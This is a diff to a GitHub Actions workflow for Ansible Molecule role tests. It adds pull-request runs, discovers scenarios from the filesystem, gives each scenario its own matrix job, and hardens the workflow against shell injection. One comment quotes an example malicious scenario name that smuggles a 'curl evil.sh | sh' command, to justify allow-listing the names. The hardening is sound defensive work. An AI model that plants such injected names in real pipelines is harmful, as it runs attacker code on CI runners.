@@ -4,6 +4,10 @@ name: Molecule Test
 on:
   push:
     branches: [main]
+  # Gate pull requests. Without this the per-scenario results only ever appeared
+  # on a develop->main promotion, i.e. after review, on main. See the header
+  # comment on the `molecule` job for what that hid.
+  pull_request:
   # Callable so the upstream-revalidate listener can re-run role tests when
   # terraform-proxmox cuts a release; manual trigger for ad-hoc runs.
   workflow_call:
@@ -13,8 +17,100 @@ permissions:
   contents: read
 
 jobs:
-  molecule:
+  # Static contract tests. These are cheap, scenario-independent, and were
+  # previously wedged in front of the molecule steps in the same job, so a
+  # molecule failure said nothing about them and vice versa.
+  contracts:
+    name: Static contracts
     runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+
+      - name: Set up Python
+        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
+        with:
+          python-version: "3.12"
+
+      # The apt caching-proxy hook exists for the UNREACHABLE case, which a
+      # molecule container cannot present. The test extracts the script from the
+      # role rather than copying it, so role drift fails here.
+      - name: Verify the apt caching-proxy auto-detect hook
+        run: python3 tests/apt_proxy_detect/test_detect.py
+
+      - name: Verify pve guest evacuation static safety contract
+        run: python3 tests/pve_guest_evacuation/test_archive_contract.py
+
+      - name: Verify bulk data comparison static safety contract
+        run: python3 tests/pve_bulk_data_compare/test_contract.py
+
+  # The scenario list is DERIVED from the filesystem, never hand-maintained.
+  #
+  # It used to be a hand-written list of `molecule test -s <name>` steps, and
+  # that list had drifted to 11 of the 25 scenarios that exist. The 14 missing
+  # ones did not fail — they simply never ran, and a hand list has no way to
+  # report what it omits. A derived list cannot omit a scenario that exists.
+  discover:
+    name: Discover scenarios
+    runs-on: ubuntu-latest
+    outputs:
+      scenarios: ${{ steps.list.outputs.scenarios }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+
+      - name: List every molecule scenario
+        id: list
+        run: |
+          set -euo pipefail
+          # A scenario is a directory under molecule/ containing molecule.yml.
+          # -printf '%h' gives the directory; sed takes the basename. Avoids
+          # piping find output through xargs, which mishandles odd filenames.
+          names=$(
+            find molecule -mindepth 2 -maxdepth 2 -name molecule.yml \
+              -printf '%h\n' | sed 's#.*/##' | sort
+          )
+
+          # Allow-list the names before they can reach a matrix value. This
+          # workflow runs on pull_request, so a directory name is attacker-
+          # controlled input: a scenario called `x; curl evil.sh | sh` would
+          # otherwise be interpolated straight into a shell. The run step below
+          # additionally takes the name through env rather than GitHub
+          # expression interpolation — both controls, not either.
+          #
+          # NB: do not write a literal GitHub expression anywhere in a run
+          # block, including in a shell comment. The runner substitutes them
+          # before bash ever sees the script, so an empty one is a workflow
+          # parse error that fails the whole file at startup with no job logs.
+          if bad=$(grep -vE '^[a-z0-9_]+$' <<<"$names"); [ -n "$bad" ]; then
+            echo "::error::Rejected molecule scenario name(s) outside [a-z0-9_]: $bad"
+            exit 1
+          fi
+
+          scenarios=$(jq -R . <<<"$names" | jq -sc .)
+          count=$(jq 'length' <<<"$scenarios")
+          if [ "$count" -eq 0 ]; then
+            echo "::error::No molecule scenarios discovered — refusing to report a vacuous pass."
+            exit 1
+          fi
+          echo "Discovered $count scenarios: $scenarios"
+          echo "scenarios=$scenarios" >> "$GITHUB_OUTPUT"
+
+  molecule:
+    name: Molecule (${{ matrix.scenario }})
+    needs: discover
+    runs-on: ubuntu-latest
+    strategy:
+      # LOAD-BEARING. These ran as serial steps in one job, so the first failing
+      # scenario left every later one `skipped` — and in a run listing a skipped
+      # step is indistinguishable from one that would have passed. That is how
+      # one scenario stayed broken across 8 consecutive runs while the 9
+      # scenarios behind it reported nothing at all. Each scenario now gets its
+      # own independent verdict.
+      fail-fast: false
+      max-parallel: 6
+      matrix:
+        scenario: ${{ fromJSON(needs.discover.outputs.scenarios) }}
     steps:
       - name: Checkout
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
@@ -35,115 +131,16 @@ jobs:
       - name: Install Ansible dependencies
         run: ansible-galaxy install -r requirements.yml
 
-      # The inventory-load and pve_ha fixture checks moved to _data-contract.yml
-      # so they run on pull requests. This workflow triggers only on
-      # push-to-main, which meant those checks could not fail a PR.
-
-      # The apt caching-proxy hook exists for the UNREACHABLE case, which a
-      # molecule container cannot present. The test extracts the script from the
-      # role rather than copying it, so role drift fails here.
-      - name: Verify the apt caching-proxy auto-detect hook
-        run: python3 tests/apt_proxy_detect/test_detect.py
-
-      - name: Verify pve guest evacuation static safety contract
-        run: python3 tests/pve_guest_evacuation/test_archive_contract.py
-
-      - name: Verify bulk data comparison static safety contract
-        run: python3 tests/pve_bulk_data_compare/test_contract.py
-      # molecule/default/verify.yml imports tests/container_start_contract.yml.
-      - name: Run default molecule test and container start contract
-        run: molecule test
+      # molecule/default/verify.yml imports tests/container_start_contract.yml,
+      # so the `default` scenario also carries the container start contract.
+      # SCENARIO reaches the script through env, not through GitHub expression
+      # interpolation into the shell. The value is a repository directory name
+      # and this workflow now runs on pull_request, so it is untrusted input;
+      # `discover` additionally allow-lists it to [a-z0-9_].
+      - name: Run the ${{ matrix.scenario }} molecule scenario
+        run: molecule test -s "$SCENARIO"
         env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run pve evacuation-gate molecule test
-        run: molecule test -s pve_evacuation_gate
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run pve evacuation staging molecule test
-        run: molecule test -s pve_evacuation_staging
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run pve bulk data comparison molecule test
-        run: molecule test -s pve_bulk_data_compare
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run frozen host-bind copy molecule test
-        run: molecule test -s pve_frozen_host_bind_copy
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run nas_storage molecule test
-        run: molecule test -s nas_storage
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run media_lxc_features molecule test
-        run: molecule test -s media_lxc_features
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      # Scenarios are enumerated by hand here, so a scenario that exists under
-      # molecule/ but is not listed NEVER RUNS IN CI. wol_enable and
-      # nvidia_driver were both in that state -- green PRs reported "Molecule
-      # (default)", which is a different scenario entirely, and reading that as
-      # coverage of the role under review is exactly the false green it looks
-      # like. Add every new scenario here when you add it.
-      - name: Run wol_enable molecule test
-        run: molecule test -s wol_enable
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run nvidia_driver molecule test
-        run: molecule test -s nvidia_driver
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run ssh_ca_trust molecule test
-        run: molecule test -s ssh_ca_trust
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run root_authorized_keys molecule test
-        run: molecule test -s root_authorized_keys
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run pve_guest_evacuation molecule test
-        run: molecule test -s pve_guest_evacuation
-        env:
-          ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
-          PY_COLORS: "1"
-          ANSIBLE_FORCE_COLOR: "1"
-
-      - name: Run pve_guest_evacuation_restore molecule test
-        run: molecule test -s pve_guest_evacuation_restore
-        env:
+          SCENARIO: ${{ matrix.scenario }}
           ANSIBLE_ALLOW_BROKEN_CONDITIONALS: "1"
           PY_COLORS: "1"
           ANSIBLE_FORCE_COLOR: "1"
